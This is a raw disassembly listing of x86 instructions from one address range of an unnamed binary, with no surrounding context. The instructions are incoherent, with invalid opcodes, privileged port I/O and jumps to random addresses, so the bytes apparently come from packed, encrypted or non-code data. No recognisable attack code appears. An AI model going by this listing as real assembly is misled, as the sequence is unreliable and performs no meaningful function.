  405191:	or     bh,BYTE PTR [ebx+0x1b5c125a]
  405197:	jmp    0x4a5239e8
  40519c:	cld    
  40519d:	jo     0x405193
  40519f:	xor    al,0x9f
  4051a1:	mov    cl,0xaa
  4051a3:	pusha  
  4051a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051a5:	sbb    BYTE PTR [ecx],ah
  4051a7:	add    bl,cl
  4051a9:	leave  
  4051aa:	pop    ecx
  4051ab:	jns    0x405154
  4051ad:	ror    DWORD PTR [ebx+0x379fb7fa],1
  4051b3:	jg     0x405223
  4051b5:	xchg   esi,eax
  4051b6:	jl     0x4051cd
  4051b8:	xchg   ecx,eax
  4051b9:	ret    
  4051ba:	and    ecx,DWORD PTR [ebp+0x32]
  4051bd:	icebp  
  4051be:	into   
  4051bf:	cmp    bh,dl
  4051c1:	fist   DWORD PTR [eax-0x47eae4d3]
  4051c7:	jb     0x405156
  4051c9:	xchg   edi,eax
  4051ca:	jne    0x405226
  4051cc:	inc    esi
  4051cd:	out    dx,eax
  4051ce:	dec    ebx
  4051cf:	or     DWORD PTR [edx],esi
  4051d1:	std    
  4051d2:	stos   DWORD PTR es:[edi],eax
  4051d3:	jbe    0x40521f
  4051d5:	data16 xor ch,bh
  4051d8:	in     eax,dx
  4051d9:	(bad)  
  4051dc:	sbb    al,0x69
  4051de:	retf   
  4051df:	lods   al,BYTE PTR ds:[esi]
  4051e0:	sub    al,0xe5
  4051e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051e3:	lock in al,dx
  4051e5:	inc    ebx
  4051e6:	sti    
  4051e7:	mov    ecx,0x5d16b04e
  4051ec:	retf   
  4051ed:	sti    
  4051ee:	xchg   ecx,eax
  4051f0:	inc    esp
  4051f1:	xlat   BYTE PTR ds:[ebx]
  4051f2:	or     DWORD PTR [ebx+ebx*8-0x66],ebx
  4051f6:	cld    
  4051f7:	aaa    
  4051f8:	aaa    
  4051f9:	push   esi
  4051fa:	push   es
  4051fb:	and    ebx,DWORD PTR [ebx+0x8]
  4051fe:	inc    eax
  4051ff:	add    ecx,DWORD PTR [edx-0x740215]
  405205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405206:	test   BYTE PTR [ebx],bh
  405208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405209:	leave  
  40520a:	cmc    
  40520b:	xchg   BYTE PTR [ebx-0x28ee7deb],cl
  405211:	pop    ss
  405212:	xor    DWORD PTR ds:0xbbeb4c17,edx
  405218:	mov    ds:0xf3b20e71,eax
  40521d:	fucomp st(7)
  40521f:	in     al,dx
  405220:	das    
  405221:	stc    
  405222:	arpl   WORD PTR [edi],dx
  405224:	inc    ebp
  405225:	lods   al,BYTE PTR ds:[esi]
  405226:	je     0x40529e
  405228:	ja     0x405233
  40522a:	xor    eax,0xe5dbe454
  40522f:	ins    BYTE PTR es:[edi],dx
  405230:	loop   0x405256
  405232:	lds    ebx,FWORD PTR [edx-0x51cf2c01]
  405238:	adc    al,0xf0
  40523a:	mov    dl,0x7d
  40523c:	bound  esi,QWORD PTR [ecx+0x27f4ed05]
  405242:	out    dx,al
  405243:	adc    BYTE PTR [edx],cl
  405245:	js     0x4051f8
  405247:	ins    BYTE PTR es:[edi],dx
  405248:	out    dx,al
  405249:	fwait
  40524a:	add    eax,0x71212923
  40524f:	mov    DWORD PTR [edi+edx*4],ebx
  405252:	xchg   edi,eax
  405253:	retf   
  405254:	xchg   esi,eax
  405255:	pop    es
  405256:	aas    
  405257:	es push edi
  405259:	clc    
  40525a:	cli    
  40525b:	xor    BYTE PTR [ebx-0x349a3eb4],ah
  405261:	inc    ebp
  405262:	enter  0x321a,0xc5
  405266:	lea    edi,[ebp+0x7474a711]
  40526c:	mov    bl,0x40
  40526e:	and    DWORD PTR [eax+edx*4-0x79],edx
  405272:	xchg   edx,eax
  405273:	add    edi,eax
  405275:	mov    cl,0x2d
  405277:	cmp    bl,BYTE PTR [ecx-0x2021de9d]
  40527d:	pop    eax
  40527e:	jge    0x4052ba
  405280:	lea    ecx,[edi]
  405282:	push   es
  405283:	nop
  405284:	test   BYTE PTR [eax],bl
  405286:	inc    esp
  405288:	pusha  
  405289:	fwait
  40528a:	mov    ss,WORD PTR [ebx]
  40528c:	sahf   
  40528d:	sbb    DWORD PTR [ebp-0x6832430d],edi
  405293:	int    0x1a
  405295:	imul   ecx,esi,0xffffffbd
  405298:	stc    
  405299:	jb     0x405268
  40529b:	outs   dx,DWORD PTR ds:[esi]
  40529c:	dec    ecx
  40529d:	or     eax,0x10580462
  4052a2:	cmp    ah,ch
  4052a4:	adc    BYTE PTR [esi-0x4ca41b7a],al
  4052aa:	push   eax
  4052ab:	or     DWORD PTR [edi-0xa532532],esi
  4052b1:	fsubr  QWORD PTR [edx-0xd]
  4052b4:	popf   
  4052b5:	rol    DWORD PTR [esp+eiz*4],1
  4052b8:	mov    WORD PTR [esi+0xa1515fc],gs
  4052be:	dec    esp
  4052bf:	xor    al,0x87
  4052c1:	psrlw  mm2,mm5
  4052c4:	jno    0x40528e
  4052c6:	jns    0x4052e5
  4052c8:	jmp    0x6149855d
  4052cd:	hlt    
  4052ce:	dec    edi
  4052cf:	cmp    al,0x11
  4052d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052d3:	mov    cl,0xd4
  4052d5:	ret    0xd6ab
  4052d8:	push   edi
  4052d9:	out    0x58,eax
  4052db:	jo     0x4052a2
  4052dd:	jae    0x405315
  4052df:	cmp    BYTE PTR [ebx+0x12],0xb5
  4052e3:	adc    al,0x3c
  4052e5:	mov    ds:0xfac0fb77,eax
  4052ea:	push   edi
  4052eb:	retf   0x1f7c
  4052ee:	or     al,0xc7
  4052f0:	lods   al,BYTE PTR ds:[esi]
  4052f1:	inc    edi
  4052f2:	lock adc al,0xea
  4052f5:	loop   0x40528a
  4052f7:	mov    dl,0xdc
  4052f9:	cdq    
  4052fa:	dec    BYTE PTR [edx-0x4]
  4052fd:	fs xchg edx,eax
  4052ff:	push   ecx
  405300:	inc    esp
  405301:	lods   al,BYTE PTR ds:[esi]
  405302:	pop    ebx
  405303:	out    0xea,al
  405305:	les    esi,FWORD PTR [eax]
  405307:	ss cmp esp,edx
  40530a:	retf   
  40530b:	pop    esi
  40530c:	sbb    DWORD PTR [ebp-0x74637b62],edi
  405312:	cld    
  405313:	sar    BYTE PTR [edi],1
  405315:	or     cl,0xe7
  405318:	les    edi,FWORD PTR [ecx+0x25586fcb]
  40531e:	xchg   esp,eax
  40531f:	push   0x79
  405321:	fcomp  st(2)
  405323:	das    
  405324:	jb     0x4052ab
  405326:	add    al,0xb8
  405328:	sbb    eax,0xd7a3c396
  40532d:	jecxz  0x4052d7
  40532f:	push   edx
  405330:	nop
  405331:	pop    esi
  405332:	and    eax,0xd03d0213
  405337:	fs into 
  405339:	scas   eax,DWORD PTR es:[edi]
  40533a:	ret    0x6e1f
  40533d:	fimul  DWORD PTR [ebp-0xb3472d6]
  405343:	xor    BYTE PTR [esp+eax*2],ah
  405346:	jmp    0x4052d6
  405348:	inc    eax
  405349:	div    DWORD PTR [ebp+0x15]
  40534c:	mov    al,0xd4
  40534e:	std    
  40534f:	mov    al,0x16
  405351:	mov    ch,0xde
  405353:	pop    ss
  405354:	sub    al,0xd7
  405356:	jno    0x4052f7
  405358:	lea    esp,[ebx+0x54]
  40535b:	shl    bh,0xd0
  40535e:	mov    ch,0x3f
  405360:	dec    ecx
  405361:	xor    BYTE PTR ds:0x8df99f1b,0x63
  405368:	push   ecx
  405369:	pop    edx
  40536a:	fcmovne st,st(3)
  40536c:	jmp    0x217b4e41
  405371:	xchg   esi,eax
  405372:	mov    edi,0x127bdd95
  405377:	adc    BYTE PTR [ebx+ebp*8],ch
  40537a:	mov    bh,BYTE PTR [ebp+0x12]
  40537d:	pop    esi
  40537e:	sar    edi,cl
  405380:	hlt    
  405381:	lock xor cl,BYTE PTR [edx-0x63]
  405385:	push   ds
  405386:	pop    ds
  405387:	test   BYTE PTR [eax],0x4
  40538a:	adc    cl,BYTE PTR [ebx-0x5c0cab61]
  405390:	bound  ebx,QWORD PTR [ebx]
  405392:	xor    DWORD PTR [edi+ecx*8-0x67],edx
  405396:	xchg   esi,eax
  405397:	sti    
  405398:	test   BYTE PTR ds:0x309ba9b1,ch
  40539e:	push   esi
  40539f:	nop
  4053a0:	leave  
  4053a1:	test   DWORD PTR [ecx+edi*2],edi
  4053a4:	and    al,BYTE PTR [ebx+0x30]
  4053a7:	inc    edx
  4053a8:	xchg   esi,eax
  4053a9:	jb     0x4053cc
  4053ab:	sbb    DWORD PTR [esi-0x2b],esi
  4053ae:	adc    al,0xa5
  4053b0:	sbb    eax,0x979e5b5d
  4053b5:	mov    dl,0x3b
  4053b7:	xchg   edx,eax
  4053b8:	jge    0x40538e
  4053ba:	push   esi
  4053bb:	add    bl,BYTE PTR [ebp+0x444ea875]
  4053c1:	xchg   esi,eax
  4053c2:	mov    ecx,ebp
  4053c4:	in     eax,dx
  4053c5:	and    al,0x1
  4053c7:	xlat   BYTE PTR ds:[ebx]
  4053c8:	xor    esp,edx
  4053ca:	sti    
  4053cb:	ins    BYTE PTR es:[edi],dx
  4053cc:	jns    0x40539b
  4053ce:	mov    ch,0xc1
  4053d0:	je     0x40539b
  4053d2:	pop    edx
  4053d3:	mov    al,ds:0xe10a112c
  4053d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053d9:	inc    esi
  4053da:	xchg   ebx,eax
  4053db:	cmp    al,0x78
  4053dd:	mov    eax,ds:0x58375170
  4053e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053e3:	mov    ch,0x26
  4053e5:	mov    es,WORD PTR [eax]
  4053e7:	pop    es
  4053e8:	mov    ?,edx
  4053ea:	jge    0x4053b6
  4053ec:	lds    edx,FWORD PTR [ebx]
  4053ee:	pop    ebp
  4053ef:	fiadd  WORD PTR [esi-0x4822b019]
  4053f5:	xor    eax,0x99c68b6a
  4053fa:	mov    bh,0x10
  4053fc:	fwait
  4053fd:	jae    0x40541d
  4053ff:	jecxz  0x4053d0
  405401:	dec    edx
  405402:	jle    0x40538d
  405404:	gs dec ebx
  405406:	sub    eax,0x338e6e0b
  40540b:	lds    eax,FWORD PTR ds:[ebx-0x4c]
  40540f:	lods   al,BYTE PTR ds:[esi]
  405410:	dec    ebp
  405411:	adc    cl,ch
  405413:	jl     0x4053e7
  405415:	stos   DWORD PTR es:[edi],eax
  405416:	and    ch,cl
  405418:	dec    ecx
  405419:	test   DWORD PTR [ebp-0x3b],esi
  40541c:	or     eax,0xe75f7f43
  405421:	addr16 in eax,0xef
  405424:	and    dh,bh
  405426:	ror    eax,1
  405428:	and    dl,BYTE PTR [eax+0x333ec68a]
  40542e:	or     DWORD PTR [eax],0xe34bc9e0
  405434:	popa   
  405435:	mov    gs,WORD PTR [edi-0x62988ec2]
  40543b:	push   ebp
  40543c:	cwde   
  40543d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40543e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40543f:	jg     0x4053dd
  405441:	cwde   
  405442:	fistp  DWORD PTR [ebx+ecx*1-0x3f]
  405446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405447:	xor    BYTE PTR [ebp-0x6c],bl
  40544a:	cld    
  40544b:	xor    BYTE PTR [edi],al
  40544d:	mov    esp,0x2ada3089
  405452:	and    eax,0x5649cb26
  405457:	dec    ecx
  405458:	push   ss
  405459:	scas   al,BYTE PTR es:[edi]
  40545a:	push   esp
  40545b:	addr16 xor ah,ch
  40545e:	push   esi
  40545f:	pop    eax
  405460:	dec    ebx
  405461:	test   DWORD PTR [ebx+0x5f],0xcab44e01
  405468:	icebp  
  405469:	inc    esi
  40546a:	aam    0xb0
  40546c:	ja     0x40548f
  40546e:	imul   esi,DWORD PTR [eax],0x5de36468
  405474:	xor    bh,BYTE PTR [eax-0x329fe29c]
  40547a:	mov    edx,edi
  40547c:	sub    BYTE PTR [esi-0x67fb8c8],bl
  405482:	jle    0x405473
  405484:	mov    DWORD PTR ds:0xbf60a8ce,edx
  40548a:	stos   BYTE PTR es:[edi],al
  40548b:	jle    0x40548d
  40548d:	pop    esi
  40548e:	fistp  WORD PTR [esi+0xb]
  405491:	test   DWORD PTR [ecx-0x19],ecx
  405494:	jle    0x40550e
  405496:	dec    eax
  405497:	inc    edx
  405498:	xor    DWORD PTR [edi-0x79],edi
  40549b:	dec    ecx
  40549c:	popf   
  40549d:	ret    0x1f51
  4054a0:	lock es fcomp DWORD PTR fs:[esp+ecx*8]
  4054a6:	idiv   BYTE PTR [ecx-0x73]
  4054a9:	adc    DWORD PTR [esi-0x80],ebx
  4054ac:	test   eax,0x79816d4c
  4054b1:	gs leave 
  4054b3:	stos   DWORD PTR es:[edi],eax
  4054b4:	repnz imul ebp,DWORD PTR [esi],0xf4e480a2
  4054bb:	aad    0x3
  4054bd:	(bad)  
  4054be:	dec    edi
  4054bf:	int3   
  4054c0:	add    DWORD PTR [esi],eax
  4054c2:	xchg   edi,eax
  4054c3:	mov    ebp,0x63108c
  4054c8:	jle    0x4054f7
  4054ca:	or     eax,0xcd7d9c02
  4054cf:	ds clc 
  4054d1:	aad    0xa5
  4054d3:	rcl    DWORD PTR [esi+0x61],cl
  4054d6:	dec    edi
  4054d7:	test   eax,0x8ef6b81
  4054dc:	push   esi
  4054dd:	test   DWORD PTR [esi],0x8346de5e
  4054e3:	fwait
  4054e4:	sub    dh,BYTE PTR [edx+0x50]
  4054e7:	leave  
  4054e8:	outs   dx,DWORD PTR ss:[esi]
  4054ea:	ret    
  4054eb:	cmp    ebp,ebp
  4054ed:	(bad)  
  4054ee:	mov    ds:0x3b23b79c,al
  4054f3:	cmp    BYTE PTR [esi+ebx*8+0x5c],dh
  4054f7:	pop    ds
  4054f8:	push   ebx
  4054f9:	mov    ds:0x4ca28ac8,al
  4054fe:	push   esi
  4054ff:	call   0xd721:0xff377b2e
  405506:	cmp    edx,ecx
  405508:	mov    esi,esi
  40550a:	xor    BYTE PTR ds:[eax],ah
  40550d:	xor    eax,0x3c3b6f4e
  405512:	stos   DWORD PTR es:[edi],eax
  405513:	stc    
  405514:	mov    al,ds:0x60e7d224
  405519:	adc    eax,0x7ddee2a2
  40551e:	clc    
  40551f:	outs   dx,DWORD PTR ds:[esi]
  405520:	test   al,0xa5
  405522:	dec    esp
  405523:	sub    eax,0x913811f0
  405528:	sbb    BYTE PTR [edi-0x656be4f2],ah
  40552e:	fidiv  DWORD PTR [ecx+edx*4-0x63]
  405532:	in     al,0xe7
  405534:	push   ds
  405535:	imul   ecx,DWORD PTR [esi+eax*8-0x30],0x69df41ba
  40553d:	xchg   ebp,eax
  40553e:	sub    eax,0x9df20c78
  405543:	cs dec eax
  405545:	mov    bh,ch
  405547:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405548:	sbb    ebx,DWORD PTR [ecx]
  40554a:	jnp    0x4055cb
  40554c:	and    eax,0xdfaa3f76
  405551:	ja     0x4054dd
  405553:	xor    esi,DWORD PTR [edx+0x2c68e6a5]
  405559:	retf   
  40555a:	std    
  40555b:	add    dh,ah
  40555d:	pushf  
  40555e:	call   0x3798:0x88b679fc
  405565:	inc    ebp
  405566:	or     DWORD PTR [ebx],esi
  405568:	leave  
  405569:	data16 add dl,BYTE PTR [eax-0x3e33fc4]
  405570:	dec    ebp
  405571:	call   0x90df768c
  405576:	and    ecx,ecx
  405578:	or     DWORD PTR [ebx+0x13],ebp
  40557b:	ins    BYTE PTR es:[edi],dx
  40557c:	scas   eax,DWORD PTR es:[edi]
  40557d:	xchg   edx,eax
  40557e:	jo     0x4055f8
  405580:	dec    edx
  405581:	or     eax,0x2847ce4a
  405586:	mov    eax,ds:0xb18b905c
  40558b:	stos   DWORD PTR es:[edi],eax
  40558c:	xchg   BYTE PTR [esi],ah
  40558e:	int    0xae
  405590:	mov    cl,0x19
  405592:	push   0x29a0c34a
  405597:	sub    al,0x9c
  405599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40559a:	xchg   esi,eax
  40559b:	mul    DWORD PTR [esi-0x61]
  40559e:	inc    esi
  40559f:	les    esi,FWORD PTR [edi-0x541cbf2]
  4055a5:	retf   
  4055a6:	adc    BYTE PTR [edx+0x2a],0xc0
  4055aa:	xchg   edx,eax
  4055ab:	jne    0x405555
  4055ad:	test   al,0xe1
  4055af:	test   BYTE PTR [edi-0x13],ch
  4055b2:	and    ebx,esp
  4055b4:	vpsubq ymm0,ymm6,ymm6
  4055b8:	(bad)  
  4055b9:	pop    ecx
  4055ba:	repnz sbb edx,DWORD PTR [edx-0x3]
  4055be:	fadd   DWORD PTR [ecx]
  4055c0:	stos   DWORD PTR es:[edi],eax
  4055c1:	mul    BYTE PTR [ebx+ecx*4]
  4055c4:	sub    edi,eax
  4055c6:	retf   0xde00
  4055c9:	add    DWORD PTR [ebx],ebp
  4055cb:	push   eax
  4055cc:	in     al,0x90
  4055ce:	mov    es,edi
  4055d0:	stos   WORD PTR es:[edi],ax
  4055d2:	mov    cl,0x4d
  4055d4:	pop    es
  4055d5:	stos   DWORD PTR es:[edi],eax
  4055d6:	aam    0xc
  4055d8:	fistp  DWORD PTR [ecx+0x53cd4f98]
  4055de:	pop    eax
  4055df:	out    0xa9,al
  4055e1:	sbb    al,dh
  4055e3:	ret    
  4055e4:	call   0x1763f29f
  4055e9:	push   ds
  4055ea:	dec    ebp
  4055eb:	fldl2t 
  4055ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055ee:	or     DWORD PTR [edi-0x15db43b],eax
  4055f4:	sub    al,0xdb
  4055f6:	sbb    eax,0x95e6f96e
  4055fb:	mov    edi,0xb2d4f5a8
  405600:	adc    DWORD PTR [ecx-0x74],0x8e2bc5fa
  405607:	iret   
  405608:	and    DWORD PTR [ecx-0x1b],0x7e63d635
  40560f:	clc    
  405610:	sbb    al,0x8
  405612:	enter  0xb1b8,0xb8
  405616:	pop    esp
  405617:	aad    0x1b
  405619:	out    0xeb,eax
  40561b:	imul   DWORD PTR [esp+ebp*2+0x33fd11f1]
  405622:	push   ds
  405623:	jmp    0x6e33edca
  405628:	sub    BYTE PTR [ebp-0x6c],bl
  40562b:	add    edi,esi
  40562d:	add    eax,0x1b6ea1fd
  405632:	fldcw  WORD PTR [ebp-0x4a3b194e]
  405638:	mov    ah,0xb8
  40563a:	loope  0x405690
  40563c:	stos   BYTE PTR es:[edi],al
  40563d:	leave  
  40563e:	add    al,0x31
  405640:	xor    eax,0xe7bc10af
  405645:	repz popa 
  405647:	sbb    eax,0x25291543
  40564c:	iret   
  40564d:	stos   BYTE PTR es:[edi],al
  40564e:	sub    al,0x9c
  405650:	shr    DWORD PTR [eax+0x39],0x6
  405654:	mov    edi,0x383e259b
  405659:	push   edx
  40565a:	mov    ch,0x1e
  40565c:	or     al,BYTE PTR [edi-0x80]
  40565f:	shl    esp,cl
  405661:	retf   0x681a
  405664:	cmp    eax,0xeb458ddc
  405669:	pop    esp
  40566a:	cdq    
  40566b:	push   esp
  40566c:	mov    cl,0x73
  40566e:	ret    
  40566f:	and    bh,BYTE PTR [edi+0x3b7d74a]
  405675:	xchg   ecx,eax
  405676:	aas    
  405677:	xor    edx,DWORD PTR [esi+0x55]
  40567a:	adc    bh,bl
  40567c:	adc    eax,DWORD PTR [edx]
  40567e:	fcomp  st(7)
  405680:	and    al,0xff
  405682:	xchg   DWORD PTR [ebx],edx
  405684:	sbb    DWORD PTR [eax+0x64b2897e],ebx
  40568a:	fucomp st(2)
  40568c:	mov    ds:0x114d5e97,eax
  405691:	inc    esp
  405692:	not    DWORD PTR [eax]
  405694:	xor    esi,0x1a84c34e
  40569a:	aaa    
  40569b:	push   ss
  40569c:	add    eax,0x4cf309a2
  4056a1:	loop   0x4056e3
  4056a3:	iret   
  4056a4:	jmp    0x40563b
  4056a6:	dec    eax
  4056a7:	push   0xf1632c5
  4056ac:	in     al,0xa2
  4056ae:	scas   al,BYTE PTR es:[edi]
  4056af:	xchg   esp,eax
  4056b0:	and    al,BYTE PTR [esi+0x51045c07]
  4056b6:	stos   DWORD PTR es:[edi],eax
  4056b7:	xchg   DWORD PTR [esi-0x69],eax
  4056ba:	jle    0x4056e6
  4056bc:	inc    ebp
  4056bd:	pop    ebp
  4056be:	leave  
  4056bf:	add    BYTE PTR [ecx],dh
  4056c1:	mov    al,0xfc
  4056c3:	ficomp WORD PTR [ecx+0x57ef7847]
  4056c9:	mov    ?,ebp
  4056cb:	inc    edx
  4056cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056cd:	loop   0x40572a
  4056cf:	xchg   ecx,eax
  4056d0:	push   es
  4056d1:	or     edi,DWORD PTR ds:0x24193796
  4056d7:	xor    edx,DWORD PTR [edi]
  4056d9:	adc    BYTE PTR [ebx-0x6a],bl
  4056dc:	jb     0x405716
  4056de:	inc    ecx
  4056df:	popf   
  4056e0:	ror    DWORD PTR [edx-0x31],cl
  4056e3:	xchg   ebp,eax
  4056e4:	pop    edx
  4056e5:	dec    edx
  4056e6:	sbb    esp,ecx
  4056e8:	push   0x32
  4056ea:	sbb    dh,0xcb
  4056ed:	xchg   edi,eax
  4056ee:	sahf   
  4056ef:	jne    0x24dd664
  4056f5:	sti    
  4056f6:	int3   
  4056f7:	ret    0x246a
  4056fa:	fst    QWORD PTR [ecx-0x5a]
  4056fd:	or     ch,al
  4056ff:	imul   esp,ebx,0xffffffc4
  405702:	or     esi,ecx
  405704:	mov    dl,0x9e
  405706:	sbb    BYTE PTR [eax+0x2c7e4e52],bh
  40570c:	(bad)
  405710:	cdq    
  405711:	inc    esi
  405712:	and    al,0x42
  405714:	lea    esp,[ecx]
  405716:	lock add DWORD PTR [edi+0x2e5162db],esp
  40571d:	in     eax,0x36
  40571f:	sbb    ch,dl
  405721:	jne    0x405760
  405723:	ds xchg esi,eax
  405725:	adc    eax,0xbf91421e
  40572a:	dec    ebx
  40572b:	out    0x80,eax
  40572d:	mov    BYTE PTR [edi+0x12],bl
  405730:	push   edi
  405731:	sub    ecx,DWORD PTR [ebp-0x26]
  405734:	xor    edx,DWORD PTR [esi-0x7]
  405737:	aas    
  405738:	neg    BYTE PTR [edx+edx*1]
  40573b:	sub    BYTE PTR [edx],al
  40573d:	dec    edx
  40573e:	cld    
  40573f:	inc    eax
  405740:	inc    esp
  405741:	sub    al,0x7e
  405743:	fucom  st(0)
  405745:	shr    DWORD PTR [edx+0x3d],1
  405748:	push   ebp
  405749:	add    al,0x11
  40574b:	ficom  DWORD PTR [ecx-0x19]
  40574e:	add    al,BYTE PTR [esi+0x2963e045]
  405754:	retf   0xda15
  405757:	add    bh,BYTE PTR [edx]
  405759:	inc    esi
  40575a:	int    0x76
  40575c:	add    BYTE PTR [ebx-0x1efa45ca],bl
  405762:	jecxz  0x405748
  405764:	cmp    DWORD PTR [edi+0x5496992a],esp
  40576a:	in     eax,dx
  40576b:	sbb    BYTE PTR [esi+0x5468b7ae],0x15
  405772:	mov    eax,ds:0x4c216b7a
  405777:	lds    edi,FWORD PTR [ecx-0x4a7d83c7]
  40577d:	inc    edx
  40577e:	test   eax,0xfb83afc6
  405783:	loopne 0x405728
  405785:	or     al,bl
  405787:	pop    ecx
  405788:	cmp    eax,0x8aa4d5e4
  40578d:	mov    ecx,eax
  40578f:	push   0x19
  405791:	mov    ds:0x3a29fac2,al
  405796:	or     bl,al
  405798:	adc    DWORD PTR [esi-0x7f],ecx
  40579b:	mov    dl,0x0
  40579d:	add    ebp,DWORD PTR [esi-0x10bc14de]
  4057a3:	mov    ds:0x64bda318,eax
  4057a8:	sub    DWORD PTR [edx-0xd],0xffffffc7
  4057ac:	out    0x77,eax
  4057ae:	sbb    BYTE PTR [ecx],ah
  4057b0:	imul   ebp,DWORD PTR [edi-0x3d],0x347a5bce
  4057b7:	add    DWORD PTR [ebx],eax
  4057b9:	ins    BYTE PTR es:[di],dx
  4057bb:	jbe    0x405794
  4057bd:	retf   0x3a4e
  4057c0:	inc    bh
  4057c2:	or     ah,dh
  4057c4:	xchg   esp,eax
  4057c5:	repz mov cl,0x1d
  4057c8:	out    0x4a,eax
  4057ca:	jnp    0x4057c1
  4057cc:	(bad)  
  4057cd:	popa   
  4057ce:	std    
  4057cf:	and    edi,0x19c3724e
  4057d5:	jne    0x4057c0
  4057d7:	pop    ss
  4057d8:	fisub  DWORD PTR [edx+eiz*1]
  4057db:	fadd   st,st(7)
  4057dd:	imul   ebx,esi,0x9dafd400
  4057e3:	mov    BYTE PTR [edi],dh
  4057e5:	sti    
  4057e6:	(bad)  
  4057e7:	hlt    
  4057e8:	cmp    eax,0x9d2d9fe5
  4057ed:	test   al,0x76
  4057ef:	rcr    DWORD PTR [ebx],0x40
  4057f2:	sub    cl,BYTE PTR [esi-0x7b050b0d]
  4057f8:	adc    dh,dh
  4057fa:	test   DWORD PTR [ebx-0x2],ebp
  4057fd:	nop
  4057fe:	push   edi
  4057ff:	clc    
  405800:	fst    QWORD PTR [edi+0x7b]
  405803:	pop    ecx
  405804:	outs   dx,DWORD PTR ds:[esi]
  405805:	loop   0x40581b
  405807:	sub    ecx,DWORD PTR [ebx+0x5595ac04]
  40580d:	and    BYTE PTR [esi-0x4e],cl
  405810:	call   0xbbf:0xdcb0e712
  405817:	cmp    edx,DWORD PTR [esi]
  405819:	ins    DWORD PTR es:[edi],dx
  40581a:	push   edx
  40581b:	sbb    BYTE PTR [ebx],ch
  40581d:	in     al,0x81
  40581f:	inc    esp
  405820:	xlat   BYTE PTR ds:[ebx]
  405821:	ret    
  405822:	add    al,BYTE PTR [esi]
  405824:	jno    0x40580a
  405826:	mov    al,0xa1
  405828:	pop    esp
  405829:	cmp    al,0xb
  40582b:	fidiv  DWORD PTR [edi+0x3d]
  40582e:	or     al,0xd2
  405830:	rcr    DWORD PTR [eax],0x6a
  405833:	push   0xaa95516a
  405838:	or     al,BYTE PTR [edi]
  40583a:	pop    ecx
  40583b:	mov    bl,0xc6
  40583d:	std    
  40583e:	test   eax,0x3f8993be
  405843:	(bad)  
  405844:	pop    esi
  405845:	mov    esi,0xb1df71e7
  40584a:	into   
  40584b:	ds cdq 
  40584d:	out    0xe7,eax
  40584f:	pop    esi
  405850:	dec    edi
  405851:	jmp    0xfd85804c
  405856:	ficomp WORD PTR [edx-0x7e7c692e]
  40585c:	sub    esi,DWORD PTR [esi+ebp*2]
  40585f:	xchg   DWORD PTR [esi+0x6c],ebx
  405862:	(bad)  
  405863:	ins    BYTE PTR es:[edi],dx
  405864:	inc    eax
  405865:	test   BYTE PTR [esi],cl
  405867:	scas   eax,DWORD PTR es:[edi]
  405868:	mov    dh,0x8f
  40586a:	(bad)  
  40586b:	mov    esp,0x7fe0fbcd
  405870:	arpl   WORD PTR [edx+0x60],ax
  405873:	or     BYTE PTR [edi+0x7d],dh
  405876:	dec    eax
  405877:	loope  0x4058c6
  405879:	inc    edi
  40587a:	pop    ebp
  40587b:	cmp    eax,0xcd2b8757
  405880:	jb     0x40587b
  405882:	aam    0xf
  405884:	loopne 0x405836
  405886:	loopne 0x4058e6
  405888:	dec    ecx
  405889:	xchg   ecx,eax
  40588a:	cmp    al,0x2c
  40588c:	rcl    DWORD PTR [edx],1
  40588e:	mov    ebp,0x1e240e99
  405893:	stos   BYTE PTR es:[edi],al
  405894:	mov    ebx,0x9d2ac428
  405899:	inc    esi
  40589a:	test   al,0x6f
  40589c:	adc    BYTE PTR [ecx+0xcfe5ab3],cl
  4058a2:	mov    ecx,0x2b3bd882
  4058a7:	sbb    DWORD PTR [eax+0x29],0x36
  4058ab:	call   0x4a46d734
  4058b0:	adc    bl,BYTE PTR [esi]
  4058b2:	inc    ebx
  4058b3:	fsub   DWORD PTR [esi-0x36c913ff]
  4058b9:	push   ebp
  4058ba:	(bad)  ds:0x7ce89d
  4058c0:	mov    dl,0x6b
  4058c2:	push   0xb6ec98be
  4058c7:	add    BYTE PTR [ecx+0x39],bl
  4058ca:	cli    
  4058cb:	cli    
  4058cc:	retf   
  4058cd:	push   ds
  4058ce:	cdq    
  4058cf:	call   0x34bf:0x63df9bc9
  4058d6:	and    cl,BYTE PTR [ecx+ebp*1-0x19784eed]
  4058dd:	cld    
  4058de:	mov    ecx,0x43ecf499
  4058e3:	test   al,0xbd
  4058e5:	mov    edx,ss
  4058e7:	aaa    
  4058e8:	ret    
  4058e9:	adc    DWORD PTR [edx+0x6],edx
  4058ec:	mov    ebp,0x14b19fee
  4058f1:	(bad)  
  4058f2:	pushf  
  4058f3:	out    0xa1,al
  4058f5:	jmp    0x2bca:0x1d627693
  4058fc:	jmp    0x405887
  4058fe:	jbe    0x405920
  405900:	and    eax,0xbf2c007b
  405905:	mov    ah,0x4d
  405907:	push   esi
  405908:	inc    ebp
  405909:	out    0x8f,eax
  40590b:	ror    BYTE PTR [ebp+0x59eb059],0x2f
  405912:	xor    eax,ebp
  405914:	cmc    
  405915:	adc    al,0x12
  405917:	call   0xc209:0xf99bf950
  40591e:	outs   dx,DWORD PTR ds:[esi]
  40591f:	mov    dh,ah
  405921:	out    dx,eax
  405922:	jl     0x4058e1
  405924:	xor    dh,BYTE PTR [ecx+0x1]
  405927:	sub    al,0x9e
  405929:	idiv   BYTE PTR [edx+0x15]
  40592c:	out    0x4f,al
  40592e:	push   ds
  40592f:	cmp    DWORD PTR [ebx+0xaa4f61b],0xc1821be0
  405939:	inc    ebx
  40593a:	ret    0x5820
  40593d:	enter  0x9411,0x45
  405941:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405942:	sub    BYTE PTR [eax],cl
